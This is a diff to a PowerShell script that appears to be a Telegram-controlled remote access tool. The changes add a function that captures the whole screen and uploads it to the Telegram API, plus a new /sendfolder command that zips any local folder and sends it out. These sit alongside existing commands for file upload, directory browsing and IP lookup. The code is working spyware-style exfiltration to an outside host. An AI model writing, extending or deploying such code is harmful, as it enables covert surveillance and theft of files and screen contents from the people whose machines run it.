@@ -82,29 +82,80 @@ function Get-PublicIP {
 }
 
 function Send-Screenshot {
-    param ([string]$chatId)
+    param (
+        [string]$chatId
+    )
     try {
+        # Create temp file for screenshot
         $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+
+        # Load required assemblies
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
+
+        # Capture screenshot
         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
         $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+
+        # Save screenshot
         $bitmap.Save($screenshotPath)
         $graphics.Dispose()
         $bitmap.Dispose()
 
-        Send-TelegramFile -chatId $chatId -filePath $screenshotPath
+        # Send screenshot via Telegram
+        $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
+        $fileContentBase64 = [Convert]::ToBase64String($fileContent)
+
+        $boundary = [Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"$LF",
+            "$chatId",
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
+            "Content-Type: image/png$LF",
+            [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileContent),
+            "--$boundary--$LF"
+        ) -join $LF
+
+        Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+
+        # Clean up
         Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
         return $true
-    } catch {
+    }
+    catch {
         return $false
     }
 }
 
 function Get-PCName {
     return $env:COMPUTERNAME
+}
+
+function Send-TelegramFolder {
+    param (
+        [string]$chatId,
+        [string]$folderPath
+    )
+
+    if (-not (Test-Path $folderPath -PathType Container)) {
+        return "Folder not found: $folderPath"
+    }
+
+    try {
+        $zipPath = "$env:TEMP\$(Split-Path $folderPath -Leaf)_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+        Compress-Archive -Path $folderPath -DestinationPath $zipPath -Force
+        $result = Send-TelegramFile -chatId $chatId -filePath $zipPath
+        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+        return $result
+    } catch {
+        return "Error zipping/sending folder: $_"
+    }
 }
 
 function Send-HelpMessage {
@@ -122,6 +173,7 @@ Available Commands:
 /screenshot - Sends a screenshot.
 /pcname - Shows the computer name.
 /sendfile <path> - Sends a file from local disk.
+/sendfolder <path> - Sends a zipped folder from local disk.
 cd <path> - Change directory.
 cd - Show current directory.
 ls or dir - List files and folders.
@@ -190,7 +242,7 @@ while ($true) {
                 Send-HelpMessage -chatId $chatId
                 continue
             }
-            elseif ($text -eq "/get_ip") {
+            elseif ($text -eq "/ip") {
                 $localIP = Get-LocalIP
                 $publicIP = Get-PublicIP
                 $reply = "Local IP: $localIP`nPublic IP: $publicIP"
@@ -232,6 +284,13 @@ while ($true) {
                     $filePath = Join-Path $global:CurrentDirectory $filePath
                 }
                 $reply = Send-TelegramFile -chatId $chatId -filePath $filePath
+            }
+            elseif ($text -match "^/sendfolder\s+(.+)$") {
+                $folderPath = $matches[1].Trim('"')
+                if (-not [System.IO.Path]::IsPathRooted($folderPath)) {
+                    $folderPath = Join-Path $global:CurrentDirectory $folderPath
+                }
+                $reply = Send-TelegramFolder -chatId $chatId -folderPath $folderPath
             }
             else {
                 $reply = "Unknown command."
